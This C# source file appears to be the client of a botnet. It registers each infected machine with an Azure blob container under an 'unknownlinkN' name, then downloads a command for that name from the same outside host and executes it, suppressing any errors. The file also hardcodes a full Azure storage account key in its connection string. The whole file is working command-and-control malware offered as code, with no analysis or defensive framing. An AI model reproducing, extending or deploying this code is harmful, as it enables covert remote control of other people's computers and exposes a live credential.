using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Azure.Storage;
using Azure.Storage.Blobs;
using Azure.Storage.Blobs.Models;
using System.Net;
using System.Threading;
using HRSH_Shard_Client.commands;
using HRSH_Shard_Client.tools;
using System.Diagnostics.Eventing.Reader;

namespace HRSH_Shard_Client
{
    internal class Program
    {
        private static readonly string logs = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\ssn\log.dat";
        private static readonly string data = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\ssn\data.dat";
        private static readonly string link = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\ssn\links.dat";
        private static readonly string connectionString = "DefaultEndpointsProtocol=https;AccountName=an0maly;AccountKey=JSG0oVViqz6/IwWfKnYzNQTCjNHSReKg6Thr1VvDXaty5PRlwBP92mQLUtz3XNsbGE37LhZO75HH+AStl0QZmg==;EndpointSuffix=core.windows.net";

        private static commandHandler ch;

        private static IniFile dataIni = new IniFile(data);

        static void Main(string[] args)
        {
            LogEntry("Starting Up");
            ch = new commandHandler();
            CheckAssignName();

            //start:

            RunCommand();
            //Thread.Sleep(3000);

            //goto start;
        }

        // Check if the necessary files exist before writing anything to them.
        private static void CheckLog()
        {
            if(!Directory.Exists(Path.GetDirectoryName(logs)))
                Directory.CreateDirectory(Path.GetDirectoryName(logs));

            if(!File.Exists(logs))
            {
                FileStream fs = File.Create(logs);
                fs.Dispose();
            }

            if (!File.Exists(data))
            {
                FileStream fs = File.Create(data);
                fs.Dispose();
            }

            if(!File.Exists(link))
            {
                FileStream fs = File.Create(link);
                fs.Dispose();
            }
        }

        // Add entry to log with given message and current time.
        public static void LogEntry(string logText)
        {
            CheckLog();
            string logentry = "[" + DateTime.Now.ToString() + "] " + logText;
            StreamWriter sw = File.AppendText(logs);
            sw.WriteLine(logentry);
            sw.Dispose();
        }

        // Delete the specified blog with it's name and container as argument.
        private static void DeleteBlob(string blobName, string container)
        {
            BlobServiceClient blobServiceClient = new BlobServiceClient(connectionString);
            string containerName = container;
            BlobContainerClient containerClient = blobServiceClient.GetBlobContainerClient(containerName);
            BlobClient blobClient = containerClient.GetBlobClient(blobName);
            if (blobClient.Exists())
            {
                blobClient.DeleteIfExists();
                LogEntry("Deleting block.");
            }
            else
                LogEntry("Block not found.");
        }

        private static void UpdateLinkData(string filePath, string updatedLinkData)
        {
            string fileName = Path.GetFileName(filePath);
            BlobServiceClient blobServiceClient = new BlobServiceClient(connectionString);
            string containerName = "server";
            BlobContainerClient containerClient = blobServiceClient.GetBlobContainerClient(containerName);
            File.WriteAllText(filePath, updatedLinkData);
            BlobClient blobClient = containerClient.GetBlobClient(fileName);
            FileStream uploadFileStream = File.OpenRead(filePath);
            blobClient.UploadAsync(uploadFileStream);
            uploadFileStream.Close();
            LogEntry("Updated link data.");
        }

        // Download command and run it.
        private static void RunCommand()
        {
            string uri = "https://an0maly.blob.core.windows.net/commandbin/" + dataIni.Read("usrName", "current") + ".dat";
            WebClient client = new WebClient();
            try
            {
                string cmd = client.DownloadString(uri);
                ch.runCommand(cmd);
            }
            catch { }
        }

        // Checks list of botnets and assigns name for the current environment.
        private static void CheckAssignName()
        {
            if(!dataIni.KeyExists("usrName", "current"))
            {
                string uri = "https://an0maly.blob.core.windows.net/server/links.dat";
                WebClient client = new WebClient();
                string linkData = client.DownloadString(uri);
                string[] nameData = linkData.Split(';');

                bool nameFound = false;
                int i = 0;
                string validName;
                while(!nameFound)
                {
                    if (nameData.Contains("unknownlink" + i))
                        i++;
                    else
                    {
                        validName = "unknownlink" + i;
                        dataIni.Write("usrName", "unknownlink" + i, "current");
                        LogEntry("Assigining name: " + "unknownLink" + i);

                        string uploadData = linkData + "unknownlink" + i + ";";
                        DeleteBlob("links.dat", "server");
                        UpdateLinkData(link, uploadData);

                        nameFound = true;
                    }
                }
            }
            else
            {
                File.Delete(link);
            }
        }
    }
}
